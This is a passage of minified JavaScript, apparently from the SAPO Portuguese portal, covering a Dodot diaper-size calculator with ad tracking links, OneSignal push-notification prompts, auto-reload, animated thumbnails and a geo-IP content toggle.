t=a("["+r.selector+(e?"-"+e:"")+"]"),n=0;n<t.length;n++)u(t[n])&&d(t[n])})),n=!1}}return{init:function(t){if(!i){i=!0,t&&(t.selector&&(r.picture=t.selector),t.margin&&(r.margin=t.margin)),p();for(var n=a("["+r.selector+"-horizontal]"),o=0;o<n.length;o++)l("scroll",n[o],h(p,100));l("scroll",e,h(p,100)),l("resize",e,h(p,100))}},refresh:p}}()),SAPO.LAZYPICTURE.init()}(),Ink.requireModules(["Ink.Dom.Event_1","Ink.Dom.Css_1","Ink.UI.Modal_1","Ink.Util.Array_1"],(function(e,t,n,i){"use strict";function o(e){if(e=e||{},this.options=this.parseOptions(e),this.selectors=this.parseSelectors(e),this.container=Ink.s(e.container$||s),this.container){var t=this.getDomElements();this.hasAllRequiredElements(t)||(t=this.createWidgetDom()),this.form=t.form,this.modal=t.modal,this.weightCombo=t.weightCombo,this.submitBtn=t.submitBtn,this.results=t.results,this.resultsList=t.resultsList,this.templates=this.getTemplates(),this.diapersData=new r,this.setupWeightCombo(),this.setupSubmit()}}function r(){var e=(new Date).getTime(),t="https://bs.serving-sys.com/serving/adServer.bs?cn=trd&mc=click&pli=26835248&PluID=0&ord="+e,n="https://bs.serving-sys.com/serving/adServer.bs?cn=display&c=19&mc=imp&pli=26835248&PluID=0&ord="+e+"&rtu=-1",i="https://bs.serving-sys.com/serving/adServer.bs?cn=trd&mc=click&pli=26835247&PluID=0&ord="+e,o="https://bs.serving-sys.com/serving/adServer.bs?cn=display&c=19&mc=imp&pli=26835247&PluID=0&ord="+e+"&rtu=-1",r="https://bs.serving-sys.com/serving/adServer.bs?cn=trd&mc=click&pli=26835249&PluID=0&ord="+e,a="https://bs.serving-sys.com/serving/adServer.bs?cn=display&c=19&mc=imp&pli=26835249&PluID=0&ord="+e+"&rtu=-1",s="https://bs.serving-sys.com/serving/adServer.bs?cn=trd&mc=click&pli=26835250&PluID=0&ord="+e,l="https://bs.serving-sys.com/serving/adServer.bs?cn=display&c=19&mc=imp&pli=26835250&PluID=0&ord="+e+"&rtu=-1",c=[{name:"Fraldas Dodot",minWeight:3,maxWeight:6,size:"2",desc:"Dodot, com 3 Tubos Ultra-Absorventes que ajudam a distribuir o xixi uniformemente",href:t,pic:"dodot.jpg",imp:n},{name:"Fraldas Dodot",minWeight:5,maxWeight:10,size:"3",href:t,pic:"dodot.jpg",imp:n},{name:"Fraldas Dodot",minWeight:6,maxWeight:11,size:"3+",href:t,pic:"dodot.jpg",imp:n},{name:"Fraldas Dodot",minWeight:8,maxWeight:14,size:"4",href:t,pic:"dodot.jpg",imp:n},{name:"Fraldas Dodot",minWeight:9,maxWeight:15,size:"4+",href:t,pic:"dodot.jpg",imp:n},{name:"Fraldas Dodot",minWeight:11,maxWeight:17,size:"5",href:t,pic:"dodot.jpg",imp:n},{name:"Fraldas Dodot",minWeight:13,maxWeight:19,size:"5+",href:t,pic:"dodot.jpg",imp:n},{name:"Fraldas Dodot",minWeight:15,maxWeight:1/0,size:"6",href:t,pic:"dodot.jpg",imp:n},{name:"Fraldas Cueca Dodot Pants",minWeight:5,maxWeight:10,size:"3",desc:"Tão seca como fácil de trocar",href:i,pic:"dodot-pants.jpg",imp:o},{name:"Fraldas Cueca Dodot Pants",minWeight:8,maxWeight:14,size:"4",href:i,pic:"dodot-pants.jpg",imp:o},{name:"Fraldas Cueca Dodot Pants",minWeight:11,maxWeight:17,size:"5",href:i,pic:"dodot-pants.jpg",imp:o},{name:"Fraldas Cueca Dodot Pants",minWeight:15,maxWeight:1/0,size:"6",href:i,pic:"dodot-pants.jpg",imp:o},{name:"Protection Plus Sensitive",minWeight:1.5,maxWeight:2.5,size:"0",desc:"A nossa máxima proteção da pele",href:s,pic:"dodot-pps.jpg",imp:l},{name:"Protection Plus Sensitive",minWeight:2,maxWeight:5,size:"1",desc:"A nossa máxima proteção da pele",href:s,pic:"dodot-pps.jpg",imp:l},{name:"Protection Plus Sensitive",minWeight:4,maxWeight:8,size:"2",desc:"A nossa máxima proteção da pele",href:s,pic:"dodot-pps.jpg",imp:l},{name:"Protection Plus Sensitive",minWeight:6,maxWeight:10,size:"3",desc:"A nossa máxima proteção da pele",href:s,pic:"dodot-pps.jpg",imp:l},{name:"Protection Plus Activity",minWeight:6,maxWeight:10,size:"3",desc:"Conforto e proteção da pele juntos numa fralda",href:r,pic:"dodot-ppa.jpg",imp:a},{name:"Protection Plus Activity",minWeight:7,maxWeight:11,size:"3+",desc:"Conforto e proteção da pele juntos numa fralda",href:r,pic:"dodot-ppa.jpg",imp:a},{name:"Protection Plus Activity",minWeight:9,maxWeight:14,size:"4",desc:"Conforto e proteção da pele juntos numa fralda",href:r,pic:"dodot-ppa.jpg",imp:a},{name:"Protection Plus Activity",minWeight:10,maxWeight:15,size:"4+",desc:"Conforto e proteção da pele juntos numa fralda",href:r,pic:"dodot-ppa.jpg",imp:a},{name:"Protection Plus Activity",minWeight:11,maxWeight:16,size:"5",desc:"Conforto e proteção da pele juntos numa fralda",href:r,pic:"dodot-ppa.jpg",imp:a},{name:"Protection Plus Activity",minWeight:12,maxWeight:17,size:"5+",desc:"Conforto e proteção da pele juntos numa fralda",href:r,pic:"dodot-ppa.jpg",imp:a},{name:"Protection Plus Activity",minWeight:13,maxWeight:1/0,size:"6",desc:"Conforto e proteção da pele juntos numa fralda",href:r,pic:"dodot-ppa.jpg",imp:a}];this.getDiapers=function(e){var t=c.reduce((function(t,n){return e>=n.minWeight&&e<=n.maxWeight&&(t[n.name]=t[n.name]||{name:n.name,desc:n.desc,href:n.href,pic:n.pic,imp:n.imp,sizes:[]},t[n.name].sizes.push({size:n.size,minWeight:n.minWeight,maxWeight:n.maxWeight})),t}),{}),n=[];for(var i in t)n.push(t[i]);return n}}var a="https://"+("undefined"!=typeof IS_DEV&&IS_DEV?"js.staging.sapo.pt":"js.sapo.pt")+"/Projects/DodotLifestyle2/"+"img/",s=".dodot-container",l=".dodot-template-weight-option",c=".dodot-template-result-item",u=".dodot-template-result-item-size";o.prototype={parseOptions:function(e){return{minWeight:e.minWeight||1.5,maxWeight:e.maxWeight||19,stepWeight:e.stepWeight||.5}},parseSelectors:function(e){return{form$:e.form$||".dodot-form",modal$:e.modal$||".dodot-modal",weightCombo$:e.weightCombo$||".dodot-weight-combo",submitBtn$:e.submitBtn$||".dodot-submit",results$:e.results$||".dodot-results",resultsList$:e.resultsList$||".dodot-results-list",weightOptionTemplate$:e.weightOptionTemplate$||l,resultItemTemplate$:e.resultItemTemplate$||c,resultItemSizeTemplate$:e.resultItemSizeTemplate$||u}},getDomElements:function(){return{form:Ink.s(this.selectors.form$,this.container),modal:Ink.s(this.selectors.modal$,this.container),weightCombo:Ink.s(this.selectors.weightCombo$,this.container),submitBtn:Ink.s(this.selectors.submitBtn$,this.container),results:Ink.s(this.selectors.results$,this.container),resultsList:Ink.s(this.selectors.resultsList$,this.container)}},getTemplates:function(){return{weightOption:Ink.s(this.selectors.weightOptionTemplate$||l,this.container).innerHTML,resultItem:Ink.s(this.selectors.resultItemTemplate$||c,this.container).innerHTML,resultItemSize:Ink.s(this.selectors.resultItemSizeTemplate$||u,this.container).innerHTML}},hasAllRequiredElements:function(e){for(var t in e)if(!e[t])return!1;return!0},createWidgetDom:function(){var e=['<section id="fraldas" class="boxed-up widget familia" data-trackerlink="HP_Section_familia|Module_diaper_calculator_7">','<div class="column-group horizontal-gutters medium-vertical-gutters small-vertical-gutters tiny-vertical-gutters">','<div class="all-100">','<div class="column-group horizontal-gutters">','<div class="patrocinio all-15 medium-100 small-100 tiny-100 align-right medium-align-center small-align-center tiny-align-center">','<img src="//c016222.cdn.sapo.io/1/c016222/imgs/v75/9cec20709ad9fe0/lifestyle/img/widgets/dodot_logo.png" alt="dodot">',"</div>",'<div class="all-85 tiny-100 small-100 medium-100">','<h3 class="quarter-bottom-space">Descubra quais as fraldas mais adequadas ao seu bébe</h3>','<p class="quarter-bottom-space">Precisa de comprar fraldas para o seu bébe mas não sabe quais as mais adequadas? Indique-nos o peso do seu bébe e apresentamos-lhe as várias gamas de fraldas DODOT disponíveis para cada etapa de crescimento.</p>',"</div>","</div>",'<form id="sapo_widget_dodot_calc_form" class="ink-form dodot-form">','<div class="column-group quarter-horizontal-gutters">','<div class="all-50 tiny-100 small-100">','<div class="control-group required">','<label for="sapo_widget_dodot_diaper_weight">Peso do Bebé</label>','<div class="control select">','<select name="sapo_widget_dodot_diaper_weight" id="sapo_widget_dodot_diaper_weight" class="dodot-weight-combo"></select>',"</div>","</div>","</div>",'<div class="all-50 tiny-100 small-100">','<div class="control-group">',"<label>&nbsp;</label>",'<button type="submit" id="btn_calc" class="ink-button full-width dodot-submit">','<i class="fa fa-calculator"></i><span>Calcular</span>',"</button>","</div>","</div>","</div>","</form>","</div>",'<div class="all-100 opcoes_fraldas dodot-results">','<ul id="sapo_widget_dodot_diaper_list" class="unstyled column-group dodot-results-list"></ul>',"</div>","</div>","</section>"].join(""),t=document.createElement("div");t.innerHTML=e;var n=t.firstChild;do{this.container.appendChild(n),n=t.firstChild}while(n);return this.getDomElements()},getWeightOptionHTML:function(e,t,n){return this.templates.weightOption.replace(/#value#/g,parseFloat((t+(n-t)/2).toFixed(1))).replace(/#minWeight#/g,parseFloat(t)).replace(/#maxWeight#/g,parseFloat(n))},getResultItemHTML:function(e,t,n,i,o,r){return this.templates.resultItem.replace(/#name#/g,e).replace(/#pic#/g,a+t).replace(/#imp#/g,n).replace(/#href#/g,i).replace(/#desc#/g,o).replace(/#sizes#/g,r.map(function(e){return this.getResultItemSizeHTML(e.size,e.minWeight,e.maxWeight)}.bind(this)).join(""))},getResultItemSizeHTML:function(e,t,n){return this.templates.resultItemSize.replace(/#size#/g,e).replace(/#weight#/g,(n==1/0?"+":"")+t+(n==1/0?"":"KG-"+n)+"KG")},setupWeightCombo:function(){if(!(this.weightCombo.children&&this.weightCombo.children.length>0)){for(var e,t=[],n=this.options.minWeight,i=this.options.maxWeight,o=this.options.stepWeight,r=n;r<i;r+=o)e=this.getWeightOptionHTML(r+o/2,r,r+o),t.push(e);this.weightCombo.innerHTML=t.join("")}},setupSubmit:function(){e.observe(this.form,"submit",function(o){e.stop(o);var r=parseFloat(this.weightCombo.value),a=this.diapersData.getDiapers(r),s=this.weightCombo.value,l=i.filter(this.weightCombo.children,(function(e){return e.value===s})),c=Ink.i("current-weight");(c&&l.length>0&&(c.innerHTML=l[0].innerHTML),this.resultsList.innerHTML=a.map(function(e){return this.getResultItemHTML(e.name,e.pic,e.imp,e.href,e.desc,e.sizes)}.bind(this)).join(""),t.removeClassName(this.results,"hide-all"),this.modal)&&n.getInstance(this.modal).open()}.bind(this))}},new o})),Ink.requireModules(["Ink.Dom.Element_1","Ink.Dom.Event_1","Ink.Util.Array_1"],(function(e,t,n){"use strict";var i=Ink.ss('form[action="/astral/compatibilidade-amorosa"]');t.observeMulti(i,"submit",(function(e){t.stop(e);var n=t.element(e),i=Ink.s('select[name="sign1"]',n).value,o=Ink.s('select[name="sign2"]',n).value;window.location.href=n.action+"/"+i+"/"+o}))})),Ink.requireModules(["Ink.Dom.Event_1","Ink.Util.Array_1","Ink.Dom.Element_1","Ink.Dom.Css","Ink.Util.Cookie_1"],(function(e,t,n,i,o){"use strict";!function(){function r(e){var i=[];t.forEach(e.children,(function(e,o,r){o>0&&"P"===e.nodeName&&t.inArray(r[o+1],r)&&"P"===r[o+1].nodeName&&(e.style.overflow="hidden",n.elementWidth(e)>300&&i.push(o),e.style.overflow="")}));var o=Math.floor(Math.random()*i.length);return{total:i.length,pos:o,validPos:i[o]}}function a(e,n){t.forEach(Ink.ss("[data-trackerlink]",e),(function(e){e.setAttribute("data-trackerlink",e.getAttribute("data-trackerlink")+"__"+n.pos+"_"+n.total)}))}var s=Ink.i("features-promotion");if(s){var l=Ink.s(".article-body .content");if(l)if(i.hasClassName(l,"paginated"))t.forEach(Ink.ss(".article-body .page"),(function(e,t){if(Ink.ss("p",e),i.hasClassName(e,"page--1")){var o=r(e);a(s,o),n.insertAfter(s,e.children[o.validPos])}}));else{var c=r(l);a(s,c),n.insertAfter(s,l.children[c.validPos])}var u=!1,d=Ink.ss("[data-promotion]");d=t.shuffle(d),t.forEach(d,(function(t,n,r){var a="promotion-"+t.getAttribute("data-promotion-name");"promotion-notifications"==a&&(o.get("have-notifications-"+s.getAttribute("data-promotion-domain"))&&i.hide(t));e.observe(Ink.s("[data-promotion-dismiss]",t),"click",(function(e){o.set(a,"hide",parseInt(this.getAttribute("data-promotion-dismiss-ttl"))),i.hide(t)})),e.observe(Ink.s("[data-promotion-stop]",t),"click",(function(e){o.set(a,"hide",parseInt(this.getAttribute("data-promotion-stop-ttl"))),i.hide(t)})),u||o.get(a)||(i.removeClassName(t,"hide-all"),u=!0)}));var h=Ink.s(".tap-widget-inline");if(null!=h){h.parentNode.removeChild(h);var p=Ink.s(".article-image");p||(p=Ink.s(".article-embed-video")),p&&p.insertAdjacentElement("afterend",h)}}}()})),Ink.createModule("SAPO.AnimatedThumbs",2,["Ink.Dom.Event_1","Ink.Dom.Element_1","Ink.Dom.Css_1","Ink.Util.Array_1"],(function(e,t,n,i){"use strict";function o(){i.forEach(Ink.ss("["+p+"]"),(function(e){(function(e){return e.getAttribute(p)===f.PLAY})(e)&&!s(e)&&a(e)}));var e=[];i.forEach(Ink.ss(g),(function(t){s(t)&&e.push(t)})),d("NUM_VIDEOS: "+e.length);var t=Ink.ss("["+p+'="'+f.PLAY+'"]')||[];d("PLAYING: "+t.length),!t.length&&1==e.length&&function(e){return e.getAttribute(p)===f.AVAILABLE}(e[0])&&r(e[0])}function r(e){if(i=Ink.s("video",e))i.play(),i.addEventListener("playing",(function(){c(e)}));else{var t=e.getAttribute(k);t.length==S&&(t=x.replace("{{randname}}",t));var i,r=t+"?countView=false",s=Ink.s(w,e)||e;if(!s)return void d("no thumb elem");if(!n.hasClassName(s,"thumb"))return void d("no thumb class");(i=document.createElement("video")).src=r,i.autoplay=!0,i.muted=!0,i.preload=!1,i.addEventListener("loadedmetadata",(function(){this.currentTime=i.duration/3}),!1),i.addEventListener("playing",(function(){e.playing=!0,c(e)})),i.addEventListener("ended",(function(){e.playing&&(e.playing=!1,a(e),o())}),!1),i.addEventListener("timeupdate",(function(){var t=this.duration/3+_>this.duration?this.duration:this.duration/3+_;if((this.currentTime>=t||this.currentTime<this.duration/3)&&!i.paused&&e.playing)return e.playing=!1,d("timeupdate: pauseVideo ---\x3e "+r),a(e),void o()}),!1),s.appendChild(i)}}function a(e){var n=e.getAttribute(k)+"?countView=false";d("pauseVideo ---\x3e "+n);var i=Ink.s("video",e);return u(e),i?void setTimeout((function(){i.duration?(d("pauseVideo: inside timeout"),i.currentTime=i.duration/3,i.pause(),u(e)):(t.remove(i),l(e))}),I):void d("pauseVideo: no video loaded ---\x3e "+n)}function s(e){return t.inViewport(e)}function l(e){e.setAttribute(p,f.AVAILABLE)}function c(e){e.setAttribute(p,f.PLAY),n.addClassName(e,b)}function u(e){e.setAttribute(p,f.PAUSE),n.removeClassName(e,b)}function d(e,t,n){E&&console.log("AnimatedThumbs: "+e,t||"",n||"")}d("----\x3eAnimatedThumbs<----");var h=Ink.ss("[data-video-randname]"),p="data-animated-thumb",f={AVAILABLE:"available",PAUSE:"pause",LOADING:"loading",PLAY:"play"},m=!((window.innerWidth||document.documentElement.clientWidth||document.body.clientWidth)>640),g=m?'[data-animated-thumb="available"]':'[data-animated-thumb="available"]:not(.video)',v=300,y=!1,_=6,b="show-video-preview",w=".thumb",k="data-video-randname",I=400,C=700,x="https://rd.videos.sapo.pt/{{randname}}/mov/1",S=20,E=!1;return{init:function(){if(function(){if(0==h.length)return!1;var e,t=document.createElement("video");return t.canPlayType&&(""!==t.canPlayType('video/mp4; codecs="mp4v.20.8"'),e=""!==(t.canPlayType('video/mp4; codecs="avc1.42E01E"')||t.canPlayType('video/mp4; codecs="avc1.42E01E, mp4a.40.2"')),""!==t.canPlayType('video/ogg; codecs="theora"'),""!==t.canPlayType('video/webm; codecs="vp8, vorbis"')),!(!navigator||!navigator.connection||"cellular"===navigator.connection.type||navigator.connection.saveData||!e)}()&&(d("INIT"),i.forEach(h,(function(e){l(e)})),o(),e.observe(window,"scroll",e.throttle(o,C)),m||(e.observeMulti(h,"mouseover",(function(e){!function(e){y||(y=!0,e.timer=setTimeout((function(){r(e),y=!1}),v))}(this)})),e.observeMulti(h,"mouseleave",(function(e){!function(e){clearTimeout(e.timer),e&&a(e),y=!1}(this)}))),E)){var t=Ink.s("body");t&&n.addClassName(t,"debug_thumbs")}}}})),Ink.requireModules(["SAPO.AnimatedThumbs_2"],(function(e){"use strict";window.AnimatedThumbs=e,e.init()})),Ink.createModule("SAPO.Notifications",1,["Ink.Util.Array_1","Ink.Dom.Element_1","Ink.Dom.Event_1","Ink.Dom.Css_1","Ink.Dom.Browser_1","Ink.UI.Modal_1","Ink.Dom.Loaded_1","SAPO.Utils_1"],(function(e,t,n,i,o,r,a){"use strict";function s(e){return"data-notifications-"+e}function l(t){t&&A.buttons&&e.forEach(A.buttons,t)}function c(){return"granted"==T.permission&&T.subscribed}function u(){m(),c()&&(T.button&&(g(T.button),delete T.button),T.promo&&T.promo()),h("denied"==T.permission),m(!1)}function d(){if(T.browser){if(T.denied){var e=Ink.s("["+s("image")+"]");e&&!e.innerHTML&&(e.innerHTML='<img src="https://homepagept.web.sapo.io/assets/img/'+T.site+"/notifications/"+T.browser+'.jpg"/>')}var t=T.denied?"firefox"==T.browser?378:430:T.height;A.modal&&(A.modal.style.height=t+"px",A.modal.style.marginTop="-"+t/2+"px")}}function h(e){if(!T.init.subdomainName){T.denied=e;var t=Ink.s("["+s("denied")+"]");t&&i.setClassName(t,T.css.hide,!e);var n=Ink.s("["+s("view")+"]");n&&i.setClassName(n,T.css.hide,e),d()}}function p(){OneSignal.setSubscription(!0)}function f(){h(!1),OneSignal.registerForPushNotifications()}function m(e){(e=0!=e)?T.loader++:T.loader--,A.body&&(e&&T.loader||!e&&!T.loader)&&i.setClassName(A.body,"loading",e)}function g(e,t){m();var n=e.hasAttribute(s("single")),o=e.getAttribute(s("tag"));l((function(e){var t=e.getAttribute(s("tag")),r=i.hasClassName(e,T.css.subscribed);o==t?r=!r:n&&(r=!1),i.setClassName(e,T.css.subscribed,r),O[t]=r})),t?m(!1):OneSignal.sendTags(O,(function(){v(O),m(!1)}))}function v(e){m();var t=!1;e&&(O=e),O&&l((function(e){var n=e.getAttribute(s("tag")),o="true"==O[n]||1==O[n];o&&(t=!0,O[n]=!0),n&&i.setClassName(e,T.css.subscribed,o)})),t&&p(),Notifications&&(Notifications.status=t),m(!1)}function y(e){m(),OneSignal.getTags().then((function(t){e&&e(),v(t)})),m(!1)}function _(){if(m(),T.init.subdomainName)OneSignal.getNotificationPermission((function(e){T.permission=e}));else{var e=window.Notification||window.webkitNotifications||navigator.mozNotification;T.permission=e&&e.permission?e.permission:""}m(!1)}function b(){OneSignal.on("notificationPermissionChange",(function(e){_(),u()}))}function w(){return!!(window.Notification||window.webkitNotifications||navigator.mozNotification)&&!(["iPad Simulator","iPhone Simulator","iPod Simulator","iPad","iPhone","iPod"].includes(navigator.platform)||navigator.userAgent.includes("Mac")&&"ontouchend"in document)&&!o.SAFARI}function k(e){T.ready=!0,y(),_(),m(),OneSignal.isPushNotificationsEnabled((function(e){T.subscribed=e,m(!1)})),u(),b(),OneSignal.on("subscriptionChange",(function(e){T.subscribed=e,u()})),l((function(e){n.observe(e,"click",(function(t){if(n.stopDefault(t),e.hasAttribute("data-preview"))g(e,!0);else if(!e.clicked){if(e.clicked=!0,c())g(e);else switch(T.button=e,T.permission){case"granted":p();break;case"denied":T.init.subdomainName?f():h(!0);break;default:f()}document.activeElement&&document.activeElement.blur&&document.activeElement.blur(),setTimeout((function(){e.clicked=!1}),1e3)}}))})),e&&e()}function I(e){if(Ink.s("["+s("script")+"]"))e&&e();else{m();var t=Ink.loadScript(T.script);t&&(t.setAttribute(s("script"),""),t.onload=function(){(function(e){for(var t in window.OneSignal=window.OneSignal||[],function(){"undefined"!=typeof InstallTrigger?T.browser="firefox":window.chrome&&(window.chrome.webstore||window.chrome.runtime)&&(T.browser=-1!=navigator.userAgent.indexOf("Edg")?"edge":"chrome")}(),oneSignalConfigs)T.init[t]=oneSignalConfigs[t];T.init.assetsPath&&(T.site=T.init.assetsPath,delete T.init.assetsPath),location&&"localhost"==location.hostname&&(T.init.subdomainName||(b=function(){navigator&&!T.init.subdomainName&&window.Promise&&"permissions"in navigator&&navigator.permissions&&navigator.permissions.query({name:"notifications"}).then((function(e){e.onchange=function(){_(),u()}}))})),OneSignal.push(["init",T.init]),OneSignal.push((function(){k(e)})),oneSignalConfigs=T.init})(e),m(!1)},A.body.appendChild(t))}}function C(e){T.opened=1,T.loader=0,m(),!T.height&&A.modal&&(T.height=A.modal.offsetHeight),d(),T.ready?y(e):I(e),m(!1)}function x(e){T.supported&&setTimeout((function(){e&&!T.opened&&!c()&&function(){if(!A.filling&&A.modal){T.filling=!0;var e=Ink.s(".modal-footer",A.modal),o=Ink.s(".modal-body",A.modal);if(e){A.text&&i.addClassName(A.text,T.css.hide),A.filling=t.create("div",{style:"z-index: 10; position: absolute; left: 1rem; right: 1rem; bottom: 1rem; background: var(--site-bg-color); display: grid; grid-template-columns: 1fr 1fr; gap: 0% 1rem;"});var r=t.create("button",{class:"ink-button main-action"});r.innerHTML="Sim",n.on(r,"click",(function(){m(),T.promo=function(){OneSignal.sendTags(O,(function(){m(!1),E.dismiss()}))},"granted"!=T.permission?f():(p(),T.promo())})),A.filling.appendChild(r);var a=t.create("button",{class:"ink-button"});a.innerHTML="Não",n.on(a,"click",(function(){l((function(e){i.removeClassName(e,T.css.subscribed)})),E.dismiss()})),A.filling.appendChild(a),e.appendChild(A.filling),l((function(e){e.setAttribute("data-preview",1)}))}o&&(A.promo=t.create("div"),i.addClassName(A.promo,"align-center"),A.promo.innerHTML="<h3>Esteja em cima do acontecimento.</h3><p>Ative as notificações do SAPO.</p>",o.insertBefore(A.promo,o.firstChild))}}(),(!e||!T.opened&&!c())&&T.supported&&"denied"!=T.permission&&(!Notifications.status||!T.subscribed)&&E.open()}),5e3)}function S(e){T.supported&&(T.ready?x(e):I((function(){x(e)})))}var E,T=(location.pathname,{site:"homepage",modal:"#modal-notifications",script:"https://cdn.onesignal.com/sdks/OneSignalSDK.js",css:{subscribed:"subscribed on",hide:"hide-all",trigger:"notifications-modal-trigger",box:"box.notifications",promos:".notifications-promo"},init:{autoResubscribe:!0,notifyButton:{enable:!1},persistNotification:!1,welcomeNotification:{title:"Obrigado pela subscrição",message:"Pode deixar de receber as notificações a qualquer altura"}},times:{visits:3,delay:15e3,rejected:1296e6}}),A={buttons:[],body:Ink.s("body")},O={};return{init:function(){T.supported=w(),T.supported&&(location&&(T.show=location.hash&&"#subscrever-notificacoes"==location.hash),A.buttons=Ink.ss("["+s("tag")+"]"),A.text=Ink.s("["+s("text")+"]"),l((function(e){var t=e.getAttribute(s("tag"));t&&(O[t]=!1)}))),a.run((function(){if(T.supported){if(!(E=r.getInstance(T.modal))&&!oneSignalConfigs)return;A.modal=E._element,A.body=E.getContentElement(),E._options.onShow=function(){Notifications.status=1,C((function(){setTimeout((function(){T.filling&&l((function(e){e.click&&e.click()})),T.filling=!1}),250)}))},E._options.onDismiss=function(){Notifications.status=0,t.remove(A.filling),t.remove(A.promo),l((function(e){e.removeAttribute("data-preview")})),T.promo=!1,A.text&&i.hasClassName(A.text,T.css.hide)&&i.removeClassName(A.text,T.css.hide)},T.show?C():T.opened||c()||function(){if(Ink.s("["+s("hello")+"]")){var e=parseInt(window.localStorage.getItem("_sphp_try")||0);(!e||Date.now()>e)&&setTimeout((function(){var e=parseInt(window.localStorage.getItem("_sphp_visits")||0);e++,window.localStorage.setItem("_sphp_visits",e),e>=T.times.visits&&(S(!0),window.localStorage.setItem("_sphp_visits",0),window.localStorage.setItem("_sphp_try",Date.now()+T.times.rejected))}),T.times.delay)}}()}else!function(){var n=Ink.ss(T.css.promos);n&&e.each(n,(function(e){e&&i.addClassName(e,T.css.hide)}));var o=Ink.s("."+T.css.trigger);if(o&&(a=o.parentElement)){var r=a.previousElementSibling;r&&(i.addClassName(r,"all-100"),i.removeClassName(r,"all-50")),t.remove(a)}var a,s=Ink.s("."+T.css.box);if(s&&(a=s.parentElement)){var l=a.previousElementSibling;l&&(i.addClassName(l,"medium-50 large-50 xlarge-50"),i.removeClassName(l,"medium-33 large-33 xlarge-33"));var c=l.previousElementSibling;c&&(i.addClassName(c,"medium-50 large-50 xlarge-50"),i.removeClassName(c,"medium-33 large-33 xlarge-33")),t.remove(a)}}()}))},promotion:S,debug:function(){var e="[one-signal]",t=[];l((function(e){var n=e.getAttribute(s("tag"));n&&t.push(n)})),console.log(e,"tags",t),console.log(e,"supported",w()),console.log(e,"config",oneSignalConfigs),window.OneSignal&&(OneSignal.getTags().then((function(t){console.log(e,"user tags",t)})),OneSignal.isPushNotificationsEnabled((function(t){console.log(e,"push enabled",t)})),OneSignal.getUserId((function(t){console.log(e,"user id",t)})))}}})),Ink.requireModules(["SAPO.Notifications_1"],(function(e){"use strict";window.Notifications=e,e.init()})),Ink.createModule("SAPO.AutoReload",1,["Ink.Util.Array_1","Ink.Dom.Css_1","Ink.Dom.Element_1","Ink.Dom.Event_1","Ink.Net.Ajax_1","SAPO.Utils_1"],(function(e,t,n,i,o,r){"use strict";function a(e,t,n,i,o){d.debug&&r.log("AutoReload",e,t,n,i,o)}function s(){a("track",h.timeout),r.trackGTMPageView(),r.trackGTMEvent("RELOAD","reload-"+h.timeout+"ms",window.location.pathname),SAPO.CPU&&SAPO.CPU.refresh('[data-pub-refresh="true"]')}function l(){h.timeout=h.element&&parseInt(h.element.getAttribute(d.selectors.time))||d.timer,d.debug&&(h.timeout=d.debugger),h.interval&&clearInterval(h.interval),h.interval=window.setInterval(u,h.timeout)}function c(){var t,n=Ink.ss("audio");if(n&&n.length)return e.each(n,(function(e){if(!e._parsed){e._parsed=!0,i.on(e,"play",(function(){e._playing=!0}));var n=function(){e._playing=!1};i.on(e,"pause",n),i.on(e,"stop",n)}e._playing&&(t=!0)})),t}function u(){var e=Ink.s(d.selectors.updated);if(a("pageUpdated",e),a("reloader page",h.page),r.isPlaying()||window.SAPO&&window.SAPO.Widgets&&window.SAPO.Widgets.VHS&&window.SAPO.Widgets.VHS.isOpen&&window.SAPO.Widgets.VHS.isOpen()||window.AmpStory&&window.AmpStory.status||window.$sapo&&window.$sapo.win&&window.$sapo.win.active||c()||window.Notifications&&Notifications.status||window.preventAutoRefresh)s();else if(e&&h.page){var n=e.getAttribute("content");n&&new o(d.api+h.page,{method:"GET",onSuccess:function(e){a(e),!e.responseJSON||e.responseJSON.update_date==n||t.hasClassName(Ink.i("video-hub-sapo"),"video-hub-sapo--show")||Ink.ss(".view-more").length?s():location.reload()},onFailure:function(){location.reload()}})}else s()}var d={debug:!1,debugger:5e3,timer:3e5,selectors:{time:"data-auto-reload-time",reload:"data-auto-reload",auto:"data-hp-auto-reload",blockpage:'body[class*="body-blockpage-"]',updated:'[property="og:updated_time"]'},blockpage:"body-blockpage-",api:"/api/service/update_date/"},h={};return function(){if((Ink.s("body["+d.selectors.reload+"]")||Ink.s("body["+d.selectors.auto+"]"))&&(h.element=Ink.s("body["+d.selectors.time+"]"),a("reloader element",h.element),h.element)){if(Ink.s(d.selectors.blockpage)){var e=Ink.s(d.selectors.blockpage).className;if(""!==e)for(var t=e.split(" "),n=0;n<t.length;n++)if(!t[n].indexOf(d.blockpage)){h.page=t[n].replace(d.blockpage,"");break}}l()}}(),{debug:function(){d.debug=!d.debug,l(),console.log("AutoReload DEBUG => "+d.debug,h.timeout)}}})),Ink.requireModules(["SAPO.AutoReload_1"],(function(e){"use strict";window.SAPO||(window.SAPO={}),window.SAPO.AutoReload=e})),Ink.createModule("SAPO.ShowContent",1,["Ink.Dom.Css_1","Ink.Net.Ajax_1","Ink.Util.Array_1","Ink.Util.Array_1","SAPO.Utils_1"],(function(e,t,n,i){"use strict";function o(){n.forEach(Ink.ss(r.blockSelector),(function(t){e.removeClassName(t,"hide-all"),setTimeout((function(){SAPO&&SAPO.LAZYPICTURE&&SAPO.LAZYPICTURE.refresh()}),200)}))}var r={geoIPScript:"https://geoip-js.com/js/apis/geoip2/v2.1/geoip2.js",getLocation:"https://geoip.sapo.pt/country",validIsoCode:"BR",blockSelector:"[data-sapobrasil-block]"},a=function(e){e&&e.country&&e.country.iso_code&&e.country.iso_code===r.validIsoCode&&o()},s=function(e){console.log("IP ERROR"),console.log(e)};return{init:function(){var e=Ink.ss(r.blockSelector);e&&e.length>0&&new t(r.getLocation,{method:"GET",cors:!0,evalJS:"force",onSuccess:function(e){var t=e.responseJSON;t&&t.country&&t.country.iso_code&&t.country.iso_code===r.validIsoCode&&o()},onFailure:function(e){console.error("GEO IP",e)}})},doMagic:o,getIPInfo:function(){geoip2&&geoip2.city(a,s)}}})),Ink.requireModules(["SAPO.ShowContent_1"],(function(e){"use strict";window.SAPO||(window.SAPO={}),window.SAPO.ShowContent=e,e.init()})),Ink.requireModules(["Ink.Util.Array_1","Ink.Dom.Css_1","Ink.Dom.Element_1"],(function(e,t,n){"use strict";!function(){window.debugPub=function(){Ink.ss("[data-pub]"),e.forEach(Ink.ss("[data-pub]"),(function(e){var t=e.getAttribute("data-pub-formatid");e.style.minHeight="30px",e.style.backgroundColor="#ff00ec",n.create("span",{className:"pubFormat",setTextContent:t,insertBottom:e})}))};var i=Ink.ss(".article-body .content > p"),o=Ink.s(".article-body 